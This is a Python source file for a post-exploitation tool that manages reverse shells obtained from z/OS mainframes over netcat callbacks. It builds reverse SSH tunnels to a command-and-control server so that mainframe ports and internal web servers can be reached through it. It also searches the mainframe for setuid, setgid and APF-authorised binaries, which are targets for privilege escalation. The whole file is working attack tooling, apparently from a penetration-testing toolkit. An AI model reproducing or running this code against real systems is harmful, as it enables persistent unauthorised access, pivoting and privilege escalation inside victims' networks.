"""Wrapper to get an interactive shell on nc-based call backs

Also provide some z/OS and ssh pivoting specific commands"""
import argparse
import logging
from configparser import ConfigParser, ExtendedInterpolation
from string import Template
from reverse_shell_management import WrappingShell

class ArgumentParserError(Exception):
    """Custom exception for argparse"""

class CmdArgumentParser(argparse.ArgumentParser):
    """Extend argparse.ArgumentParser with error management"""
    def error(self, message):
        raise ArgumentParserError(message)

class ReverseShellManager(WrappingShell):
    """Extend zosutils.WrappingShell with post-exploitation specific commands"""
    REVERSE_SH_SSH = 'ssh -i $KEYNAME $CCU@$CCS -p $CCP -o UserKnownHostsFile=$KNOWNHOSTSFILE -o StrictHostKeyChecking=yes -N '

    def __init__(self, cmdline, codepage, name='shell', sync_stdout=False, config=None):
        WrappingShell.__init__(self, cmdline, codepage, name=name, sync_stdout=sync_stdout)
        if config is not None:
            self.status_config = config['ZOS']

    def do__forward(self, args):
        """Forward any ip:port from the mainframe to a port on localhost

EXAMPLES:
    Forward port 23 on the mainframe to port 2323 on the cc server
    > _forward 127.0.0.1:23 2323

    Forward a web server as seen by the mainframe to port 8080 on the cc server
    > _forward www.target.server:80 8080"""
        try:
            target = args.split()[0]
            localport = args.split()[1]
            config = self.status_config
            ssh_step = Template(self.REVERSE_SH_SSH).substitute(
                KEYNAME=config['ftpkeyname'],
                KNOWNHOSTSFILE=config['ftpknownhosts'],
                CCU=config['cc_user'],
                CCS=config['cc_server'],
                CCP=config['cc_port'],
                NCIP=config['ebcdiccat_host'],
                NCP=config['ebcdiccat_port']
                )
            run_ssh_command = ssh_step + " -R " + localport + ":" + target + '&'
            self.default(run_ssh_command)
        except AttributeError as e:
            logging.error("No reverse SSH shell config found.")
            logging.error("Running in detached mode?")


    def do__runssh(self, args):
        """Add the command line arguments to a non interactive background ssh
reverse connection.
All the parameters are automatically derived from the current session.

EXAMPLES:
    Forward port 23 on the mainframe to port 2323 on the cc server
    > _runssh -R 2323:127.0.0.1:23

    Get access to a webserver as the mainframe:
    > _runssh -R 8000:web.server.tld:80"""
        try:
            config = self.status_config
            ssh_step = Template(self.REVERSE_SH_SSH).substitute(
                KEYNAME=config['ftpkeyname'],
                KNOWNHOSTSFILE=config['ftpknownhosts'],
                CCU=config['cc_user'],
                CCS=config['cc_server'],
                CCP=config['cc_port'],
                NCIP=config['ebcdiccat_host'],
                NCP=config['ebcdiccat_port']
                )
            run_ssh_command = ssh_step + args + '&'
            self.default(run_ssh_command)
        except AttributeError as e:
            logging.error("No reverse SSH shell config found.")
            logging.error("Running in detached mode?")


    def do__findapf(self, args):
        """Find the APF binaries by running a find conmmand into the output file.
Access permission errors are redirected to /dev/null.

USAGE:
    _findapf /path/to/mainframe/output/file.txt"""
        COMMAND = "find / -type f -ext a \( -perm -2000 -o -perm -4000 \) -o \( -ext a ! -name '*.so' ! -name '*.dll' \) -exec ls -E '{}' \;"
        outfile = args.split()[0]
        runme = '%s > %s 2>/dev/null &' % (COMMAND, outfile)
        self.default(runme)


if __name__ == '__main__':
    # Argument parsing
    parser = argparse.ArgumentParser(
        description='Wraps a CLI program stdin/stdout in an encoding converter')
    parser.add_argument('-e', '--encoding', type=str, help='set the encoding (default cp037)',
                        default='cp037')
    parser.add_argument('-n', '--name', type=str, help='name', default='shell')
    parser.add_argument('-s', '--statefile', type=str,
                        help='load a statefile for detached mode reverse shell')
    parser.add_argument(
        '-a',
        '--asyncio',
        help='asynchronous IO (like netcat)',
        default=True,
        action='store_false',
        )
    subparsers = parser.add_subparsers(
        title='subcommand',
        description='external command to wrap',
        help='program to execute',
        )
    command_parser = subparsers.add_parser('cmd', add_help=False)

    local_arguments, wrapped_command = parser.parse_known_args()
    wrapping_encoding = local_arguments.encoding

    if local_arguments.statefile:
        config = ConfigParser(interpolation=ExtendedInterpolation())
        config.read(local_arguments.statefile)
    else:
        config = None

    if local_arguments.name is None:
        shell = ReverseShellManager(
            wrapped_command,
            wrapping_encoding,
            sync_stdout=local_arguments.asyncio,
            config=config
            )
    else:
        shell = ReverseShellManager(
            wrapped_command,
            wrapping_encoding,
            name=local_arguments.name,
            sync_stdout=local_arguments.asyncio,
            config=config
            )
    shell.cmdloop()
